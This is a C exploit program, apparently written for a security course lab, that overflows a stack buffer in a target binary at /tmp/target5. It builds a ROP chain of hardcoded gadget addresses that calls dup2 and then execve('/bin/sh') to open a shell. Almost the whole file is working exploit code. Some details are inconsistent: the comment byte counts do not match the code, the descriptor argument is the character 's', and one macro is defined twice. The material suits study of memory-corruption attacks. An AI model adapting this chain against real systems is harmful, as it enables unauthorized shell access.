#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target5"
#define DEFAULT_OUTPUT "/tmp/xploit5_output"

// Find the following gadget addr by using find_gadgets.py
#define POP_RDI_RET_ADDR 0x4d74e0
#define POP_RSI_RET_ADDR 0x4d5148
#define POP_RAX_RET_ADDR 0x4d84d1
#define SYSCALL_RET_ADDR 0x4d8265
#define POP_RDX_RET_ADDR 0x485d4b
#define POP_RAX_RET_ADDR 0x4d84d1

// Find the BIN_SH_ADDR by using
// printf(%p) on the "char* get_shell()" function
#define BIN_SH_ADDR      0x4d9000

int main(int argc, char *argv[])
{
  /* Determine size of exploit
  buf: 256 + saved RBP: 8 +
  gadget for dup2(s, 0): 56
    * position: 0x4d74e0. insts: pop %rdi; ret. bytes: 5fc3 (8) + s (8)
    * position: 0x4d5148. insts: pop %rsi; ret. bytes: 5ec3 (8) + 0 (8)
    * position: 0x4d84d1. insts: pop %rax; ret. bytes: 58c3 (8) + 33 (8)
    * position: 0x4d8265. insts: syscall; ret. bytes: 0f05c3 (8)
  gadget for dup2(s, 1): 56
    * position: 0x4d74e0. insts: pop %rdi; ret. bytes: 5fc3 (8) + s (8)
    * position: 0x4d5148. insts: pop %rsi; ret. bytes: 5ec3 (8) + 1 (8)
    * position: 0x4d84d1. insts: pop %rax; ret. bytes: 58c3 (8) + 33 (8)
    * position: 0x4d8265. insts: syscall; ret. bytes: 0f05c3 (8)
  gadget for execve("/bin/sh", 0, 0): 72
    * position: 0x4d74e0. insts: pop %rdi; ret. bytes: 5fc3 (8)
    * address of "/bin/sh", char* get_shell() = 0x4d9000 (8)
    * position: 0x4d5148. insts: pop %rsi; ret. bytes: 5ec3 (8) + 0 (8)
    * position: 0x485d4b. insts: pop %rdx; ret. bytes: 5ac3 (8) + 0 (8)
    * position: 0x4d84d1. insts: pop %rax; ret. bytes: 58c3 (8) + 59 (8)
    * position: 0x4d8265. insts: syscall; ret. bytes: 0f05c3 (8)
  */
  char exploit[256 + 8 + 56 + 56 + 72];
  char * ptr = exploit;

  // Fill exploit buffer by using ROP
  memset(exploit, 0, sizeof(exploit));
  ptr += 264;

  // dup2(s, 0): 35
  *(size_t *)(ptr) = POP_RDI_RET_ADDR; // pop %rdi; ret
  ptr += 8;
  *(size_t *)(ptr) = 's';
  ptr += 8;
  *(size_t *)(ptr) = POP_RSI_RET_ADDR; // pop %rsi; ret
  ptr += 8;
  *(size_t *)(ptr) = 0;
  ptr += 8;
  *(size_t *)(ptr) = POP_RAX_RET_ADDR; // pop %rax; ret
  ptr += 8;
  *(size_t *)(ptr) = 33;
  ptr += 8;
  *(size_t *)(ptr) = SYSCALL_RET_ADDR; // insts: syscall
  ptr += 8;

  // dup2(s, 1): 35
  *(size_t *)(ptr) = POP_RDI_RET_ADDR; // pop %rdi; ret
  ptr += 8;
  *(size_t *)(ptr) = 's';
  ptr += 8;
  *(size_t *)(ptr) = POP_RSI_RET_ADDR; // pop %rsi; ret
  ptr += 8;
  *(size_t *)(ptr) = 1;
  ptr += 8;
  *(size_t *)(ptr) = POP_RAX_RET_ADDR; // pop %rax; ret
  ptr += 8;
  *(size_t *)(ptr) = 33;
  ptr += 8;
  *(size_t *)(ptr) = SYSCALL_RET_ADDR; // insts: syscall
  ptr += 8;

  // execve("/bin/sh", 0, 0): 51
  *(size_t *)(ptr) = POP_RDI_RET_ADDR; // pop %rdi; ret
  ptr += 8;
  *(size_t *)(ptr) = BIN_SH_ADDR; // address of "/bin/sh"
  ptr += 8;
  *(size_t *)(ptr) = POP_RSI_RET_ADDR; // pop %rsi; ret
  ptr += 8;
  *(size_t *)(ptr) = 0;
  ptr += 8;
  *(size_t *)(ptr) = POP_RDX_RET_ADDR; // pop %rdx; ret
  ptr += 8;
  *(size_t *)(ptr) = 0;
  ptr += 8;
  *(size_t *)(ptr) = POP_RAX_RET_ADDR; // pop %rax; ret
  ptr += 8;
  *(size_t *)(ptr) = 59;
  ptr += 8;
  *(size_t *)(ptr) = SYSCALL_RET_ADDR; // insts: syscall

  // Write the exploit buffer to a file
  write_xploit(exploit, sizeof(exploit), DEFAULT_OUTPUT);

  char *args[] = { TARGET, DEFAULT_OUTPUT, NULL };
  char *env[] = { NULL };
  execve(TARGET, args, env);
  perror("execve failed");

  return 0;
}
